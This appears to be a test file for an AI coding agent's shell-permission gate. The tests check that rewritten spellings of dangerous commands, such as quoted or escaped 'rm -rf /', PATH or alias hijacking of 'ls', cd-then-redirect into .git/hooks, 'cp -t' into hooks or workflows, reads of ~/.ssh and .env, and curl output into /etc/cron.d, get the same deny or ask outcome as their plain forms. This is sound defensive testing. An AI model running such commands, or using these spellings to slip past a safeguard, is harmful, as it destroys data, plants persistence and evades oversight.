// kilocode_change - new file
import { AppNodeBuilder } from "@opencode-ai/core/effect/app-node-builder"
import { describe, expect, test } from "bun:test"
import { Effect, Layer, ManagedRuntime } from "effect"
import os from "os"
import path from "path"
import * as CrossSpawnSpawner from "@opencode-ai/core/cross-spawn-spawner"
import { FSUtil } from "@opencode-ai/core/fs-util"
import { ShellPermission } from "@/tool/shell"
import { SecurityDecisionAdapter } from "@/kilocode/security-decision/adapter"
import type { Permission } from "@/permission"
import { SessionID, MessageID } from "@/session/schema"
import { provideTestInstance, tmpdir } from "../../fixture/fixture"

/**
 * Route-equivalence regressions.
 *
 * Every case here is a *pair*: a canonical spelling of an action and a rewriting of it that used to
 * reach a weaker outcome. The point of the pairing is the invariant itself — the same real side
 * effect has to get the same security outcome whichever way the command line spells it — so each
 * test asserts the rewriting and the canonical form together rather than pinning one in isolation.
 *
 * These run through the production path: the real tree-sitter scan produces the facts, the adapter
 * normalizes them and the pure core decides. `ShellPermission.ask` only scans, which is what makes
 * `rm -rf /` safe to assert on.
 */

const runtime = ManagedRuntime.make(
  Layer.mergeAll(AppNodeBuilder.build(CrossSpawnSpawner.node), AppNodeBuilder.build(FSUtil.node)),
)

type Effects = Array<{ operation: string; path?: string }>

const facts = async (command: string, cwd: string) => {
  const permission = await runtime.runPromise(ShellPermission)
  const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
  const ctx = {
    sessionID: SessionID.make("ses_bypass"),
    messageID: MessageID.make("msg_bypass"),
    callID: "",
    agent: "code",
    abort: AbortSignal.any([]),
    messages: [],
    metadata: () => Effect.void,
    ask: (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) =>
      Effect.sync(() => {
        requests.push(req)
      }),
  }
  await Effect.runPromise(permission.ask(ctx as never, { command, cwd, shell: "/bin/bash" }))
  const bash = requests.find((item) => item.permission === "bash")
  return (bash?.metadata?.["securityFacts"] ?? {}) as Record<string, unknown> & { effects?: Effects }
}

const scan = async (command: string, cwd: string) => (await facts(command, cwd)).effects ?? []

/** The permission names one shell action asks for, so a scope prompt cannot silently disappear. */
const asked = async (command: string, cwd: string) => {
  const permission = await runtime.runPromise(ShellPermission)
  const requests: Array<Omit<Permission.Request, "id" | "sessionID" | "tool">> = []
  const ctx = {
    sessionID: SessionID.make("ses_bypass"),
    messageID: MessageID.make("msg_bypass"),
    callID: "",
    agent: "code",
    abort: AbortSignal.any([]),
    messages: [],
    metadata: () => Effect.void,
    ask: (req: Omit<Permission.Request, "id" | "sessionID" | "tool">) =>
      Effect.sync(() => {
        requests.push(req)
      }),
  }
  await Effect.runPromise(permission.ask(ctx as never, { command, cwd, shell: "/bin/bash" }))
  return requests.map((item) => item.permission)
}

const context = (
  cwd: string,
  containment: SecurityDecisionAdapter.Context["containment"] = {
    sandbox: "unknown",
    network: "allow",
    destinations: [],
    escalated: false,
  },
): SecurityDecisionAdapter.Context => ({
  workspace: cwd,
  effective: "allow",
  humanOnly: false,
  floor: { action: "allow", authority: "untrusted", conflict: false },
  containment,
})

/** One command all the way through: scan, normalize, decide. */
const decide = async (command: string, cwd: string, ctx = context(cwd)) =>
  SecurityDecisionAdapter.evaluate(
    {
      permission: "bash",
      patterns: [command],
      metadata: { securityFacts: await facts(command, cwd) },
      sessionID: "ses_bypass",
    },
    ctx,
  )

const CONFINED = {
  sandbox: "operational",
  network: "deny",
  destinations: [],
  escalated: false,
} as const

const withTmp = (fn: (cwd: string) => Promise<void>) => async () => {
  await using tmp = await tmpdir()
  await provideTestInstance({ directory: tmp.path, fn: () => fn(tmp.path) })
}

/** The security-relevant shape of an outcome: the rule that named it is part of it. */
const shape = (out: SecurityDecisionAdapter.Directive) => ({
  decision: out.decision,
  rule: out.rule_id,
  reviewable: out.reviewable,
})

describe.skipIf(process.platform === "win32")("an executable name only counts when the run did not move it", () => {
  test(
    "a prefix assignment removes the inert fast path",
    withTmp(async (cwd) => {
      // `ls` is on the inert allowlist because of what the program on `PATH` does. `PATH=...` picks
      // a different program under the same name, so the allowlist no longer describes what runs.
      expect(shape(await decide("ls", cwd))).toEqual({ decision: "pass", rule: "SEC.V1.NO_OPINION", reviewable: false })
      const shadowed = await decide("PATH=/tmp/evil ls", cwd)
      expect(shadowed.decision).toBe("ask")
      expect(shadowed.reviewable).toBe(false)
    }),
  )

  test(
    "an assignment that is not attached to the command still poisons the name",
    withTmp(async (cwd) => {
      // `PATH=/x && ls` parses the assignment as a sibling of the command, so a per-command check
      // never sees it. Both spellings have to land in the same place.
      for (const command of ["PATH=/tmp/evil && ls", "export PATH=/tmp/evil; ls", "PATH=/tmp/evil; ls"]) {
        const out = await decide(command, cwd)
        expect({ command, decision: out.decision }).toEqual({ command, decision: "ask" })
      }
    }),
  )

  test(
    "an alias or a function definition counts as well",
    withTmp(async (cwd) => {
      for (const command of ["alias ls=/tmp/evil; ls", "ls() { /tmp/evil; }; ls"]) {
        const out = await decide(command, cwd)
        expect({ command, decision: out.decision }).toEqual({ command, decision: "ask" })
      }
    }),
  )

  test(
    "an ordinary environment variable does not cost the command its reviewer",
    withTmp(async (cwd) => {
      // The fix must bite exactly the name-based fast paths. A command that was never judged by its
      // name keeps the outcome it had, so `CI=1 npm test` stays as reviewable as `npm test`.
      const plain = await decide("npm test", cwd, context(cwd, CONFINED))
      const assigned = await decide("CI=1 npm test", cwd, context(cwd, CONFINED))
      expect(shape(plain)).toEqual({ decision: "ask", rule: "SEC.V1.CONTAINED_EXEC", reviewable: true })
      expect(shape(assigned)).toEqual(shape(plain))
    }),
  )
})

describe.skipIf(process.platform === "win32")("quoting and spelling are not identity", () => {
  const spellings = [
    ["rm -rf /", "the canonical form"],
    ['"rm" -rf /', "double quotes"],
    ["'r''m' -rf /", "concatenated single quotes"],
    ["\\rm -rf /", "a backslash escape"],
    ["/bin/rm -rf /", "an absolute path"],
  ] as const

  test.each(spellings)("%s is a destructive root write (%s)", (command) =>
    withTmp(async (cwd) => {
      const out = await decide(command, cwd)
      expect({ command, decision: out.decision, rule: out.rule_id }).toEqual({
        command,
        decision: "deny",
        rule: "SEC.V1.DESTRUCTIVE_ROOT",
      })
    })(),
  )

  test(
    "a quoted reader reports the same read its bare form reports",
    withTmp(async (cwd) => {
      const bare = await scan("cat .env", cwd)
      expect(await scan('"cat" .env', cwd)).toEqual(bare)
      expect(await scan("/bin/cat .env", cwd)).toEqual(bare)
    }),
  )

  test(
    "a differently cased protected directory is the same protected directory",
    withTmp(async (cwd) => {
      const canonical = await decide("echo x > .git/hooks/pre-commit", cwd)
      expect(shape(canonical)).toEqual({ decision: "deny", rule: "SEC.V1.GIT_HOOK_WRITE", reviewable: false })
      expect(shape(await decide("echo x > .GIT/hooks/pre-commit", cwd))).toEqual(shape(canonical))
    }),
  )

  test(
    "a tilde names the home directory, not a workspace-relative file",
    withTmp(async (cwd) => {
      // `tree ~/.ssh` and `tree /Users/me/.ssh` are the same listing of the same private directory.
      const expanded = await decide(`tree ${path.join(os.homedir(), ".ssh")}`, cwd)
      expect(shape(expanded)).toEqual({ decision: "ask", rule: "SEC.V1.SENSITIVE_BOUNDARY", reviewable: false })
      expect(shape(await decide("tree ~/.ssh", cwd))).toEqual(shape(expanded))
    }),
  )
})

describe.skipIf(process.platform === "win32")("a bare `version` word is the tool's, not the flag's", () => {
  test(
    "a version subcommand that mutates is not a version check",
    withTmp(async (cwd) => {
      // `npm version` rewrites package.json and creates a tag and a commit; `make version` runs a
      // target; `python version` executes a file called `version`.
      for (const command of ["npm version", "yarn version", "make version", "python version"]) {
        const out = await decide(command, cwd, context(cwd, CONFINED))
        expect({ command, decision: out.decision }).toEqual({ command, decision: "ask" })
      }
    }),
  )

  test(
    "the forms that only print still pass",
    withTmp(async (cwd) => {
      for (const command of ["go version", "docker version", "node --version", "python3 --version"]) {
        const out = await decide(command, cwd)
        expect({ command, decision: out.decision }).toEqual({ command, decision: "pass" })
      }
    }),
  )
})

describe.skipIf(process.platform === "win32")("a redirect lands where the shell puts it", () => {
  test(
    "a preceding cd moves the redirect target",
    withTmp(async (cwd) => {
      expect(await scan("cd /tmp && echo hi > out.txt", cwd)).toEqual([{ operation: "update", path: "/tmp/out.txt" }])
      // The same write without the `cd` is an ordinary in-workspace file, and stays one.
      expect(await scan("echo hi > out.txt", cwd)).toEqual([{ operation: "update", path: path.join(cwd, "out.txt") }])
    }),
  )

  test(
    "the two spellings of the same out-of-workspace write agree",
    withTmp(async (cwd) => {
      const direct = await decide("echo evil > /tmp/out.txt", cwd)
      expect(shape(direct)).toEqual({ decision: "ask", rule: "SEC.V1.SENSITIVE_BOUNDARY", reviewable: false })
      expect(shape(await decide("cd /tmp && echo evil > out.txt", cwd))).toEqual(shape(direct))
    }),
  )

  test(
    "a cd whose target cannot be determined makes later targets unknown, not wrong",
    withTmp(async (cwd) => {
      expect(await scan("cd && echo hi > out.txt", cwd)).toEqual([{ operation: "update" }])
      expect(shape(await decide("cd && echo hi > out.txt", cwd))).toEqual({
        decision: "ask",
        rule: "SEC.V1.UNKNOWN_TARGET",
        reviewable: false,
      })
    }),
  )

  test(
    "an unfollowable cd loses the security path without losing the scope prompt",
    withTmp(async (cwd) => {
      // Two readings of the same argument: the external-directory scope keeps its existing anchor,
      // so a `cd` the scan cannot follow never *removes* a prompt, while the security effect loses
      // its path and is held at ask.
      expect(await asked("cd && cat ../../outside.txt", cwd)).toContain("external_directory")
      expect(await scan("cd && cat ../../outside.txt", cwd)).toEqual([{ operation: "read" }])
    }),
  )

  test(
    "a run made only of directory changes still reaches the gate when it writes",
    withTmp(async (cwd) => {
      // A `cd` contributes no permission pattern, so a redirect attached to one used to raise no ask
      // at all — and `cd . > .git/hooks/pre-commit` truncates that hook.
      expect(await asked("cd . > .git/hooks/pre-commit", cwd)).toContain("bash")
      expect(shape(await decide("cd . > .git/hooks/pre-commit", cwd))).toEqual({
        decision: "deny",
        rule: "SEC.V1.GIT_HOOK_WRITE",
        reviewable: false,
      })
      // A directory change that writes nothing still asks for nothing.
      expect(await asked("cd .", cwd)).toEqual([])
    }),
  )

  test(
    "a cd applies only to what follows it",
    withTmp(async (cwd) => {
      expect(await scan("echo hi > out.txt && cd /tmp", cwd)).toEqual([
        { operation: "update", path: path.join(cwd, "out.txt") },
      ])
    }),
  )
})

describe.skipIf(process.platform === "win32")("copy and rename operands have roles", () => {
  test(
    "the destination is a write and the sources are reads",
    withTmp(async (cwd) => {
      expect(await scan("cp a.txt b.txt", cwd)).toEqual([
        { operation: "read", path: path.join(cwd, "a.txt") },
        { operation: "update", path: path.join(cwd, "b.txt") },
      ])
    }),
  )

  test(
    "a protected directory is protected as a destination too",
    withTmp(async (cwd) => {
      // The trailing slash is not part of the identity of the directory: `cp x .git/hooks` writes a
      // hook exactly as `cp x .git/hooks/pre-commit` does.
      const named = await decide("cp evil.sh .git/hooks/pre-commit", cwd)
      expect(shape(named)).toEqual({ decision: "deny", rule: "SEC.V1.GIT_HOOK_WRITE", reviewable: false })
      expect(shape(await decide("cp evil.sh .git/hooks", cwd))).toEqual(shape(named))
      expect(shape(await decide("mv evil.sh .git/hooks", cwd))).toEqual(shape(named))
    }),
  )

  test(
    "the same holds for the workflow directory",
    withTmp(async (cwd) => {
      const named = await decide("cp evil.yml .github/workflows/ci.yml", cwd)
      expect(shape(named)).toEqual({ decision: "ask", rule: "SEC.V1.CI_AUTHORITY", reviewable: false })
      expect(shape(await decide("cp evil.yml .github/workflows", cwd))).toEqual(shape(named))
    }),
  )

  test(
    "copying a hook out of the repository is a read of it, not a write to it",
    withTmp(async (cwd) => {
      // Roles cut both ways: reporting every operand as a write turned reading a hook into a deny.
      const out = await decide("cp .git/hooks/pre-commit /tmp/backup", cwd)
      expect(out.decision).toBe("ask")
      expect(out.rule_id).not.toBe("SEC.V1.GIT_HOOK_WRITE")
    }),
  )
})

describe.skipIf(process.platform === "win32")("a path-valued option carries a path", () => {
  test(
    "--target-directory is the destination, whichever way it is spelled",
    withTmp(async (cwd) => {
      const named = await decide("cp evil.sh .git/hooks/pre-commit", cwd)
      expect(shape(await decide("cp -t .git/hooks evil.sh", cwd))).toEqual(shape(named))
      expect(shape(await decide("cp --target-directory=.git/hooks evil.sh", cwd))).toEqual(shape(named))
    }),
  )

  test(
    "the glued spelling of an option no longer hides its value",
    withTmp(async (cwd) => {
      expect(await scan("cp --target-directory=/etc evil.sh", cwd)).toEqual([
        { operation: "update", path: "/etc" },
        { operation: "read", path: path.join(cwd, "evil.sh") },
      ])
    }),
  )

  test(
    "an option value on an unclassified command is still a path",
    withTmp(async (cwd) => {
      const out = await decide("curl --output=/etc/cron.d/job https://x.test/p", cwd, context(cwd, CONFINED))
      expect(shape(out)).toEqual({ decision: "ask", rule: "SEC.V1.SENSITIVE_BOUNDARY", reviewable: false })
    }),
  )
})

describe.skipIf(process.platform === "win32")("aggregation does not depend on argument order", () => {
  test(
    "a mandatory-human target cannot be demoted by a reviewable one beside it",
    withTmp(async (cwd) => {
      const secret = path.join(os.homedir(), ".ssh/id_rsa")
      const first = await decide(`rm build/out.js ${secret}`, cwd)
      const second = await decide(`rm ${secret} build/out.js`, cwd)
      expect(shape(first)).toEqual({ decision: "ask", rule: "SEC.V1.SENSITIVE_BOUNDARY", reviewable: false })
      expect(shape(second)).toEqual(shape(first))
    }),
  )

  test("every permutation of a fact set decides the same way", () => {
    // Directly over the fact list, so the property is asserted on the aggregation itself rather
    // than on whatever order one particular parser happened to produce.
    const effects = [
      { operation: "delete", path: "/w/build/out.js" },
      { operation: "update", path: "/w/.github/workflows/ci.yml" },
      { operation: "read", path: "/w/../outside/notes.txt" },
      { operation: "delete", path: "/w/src/a.ts" },
    ]
    const permutations = (items: typeof effects): (typeof effects)[] =>
      items.length <= 1
        ? [items]
        : items.flatMap((item, index) =>
            permutations([...items.slice(0, index), ...items.slice(index + 1)]).map((rest) => [item, ...rest]),
          )
    const outcomes = permutations(effects).map((order) =>
      shape(
        SecurityDecisionAdapter.evaluate(
          {
            permission: "bash",
            patterns: ["rm -rf x"],
            metadata: {
              securityFacts: {
                complete: true,
                composed: false,
                executable: "rm",
                argv: ["rm", "-rf", "x"],
                classified: true,
                effects: order,
              },
            },
            sessionID: "ses_order",
          },
          context("/w"),
        ),
      ),
    )
    expect(outcomes.length).toBe(24)
    expect(new Set(outcomes.map((item) => JSON.stringify(item))).size).toBe(1)
    expect(outcomes[0]!.reviewable).toBe(false)
  })
})
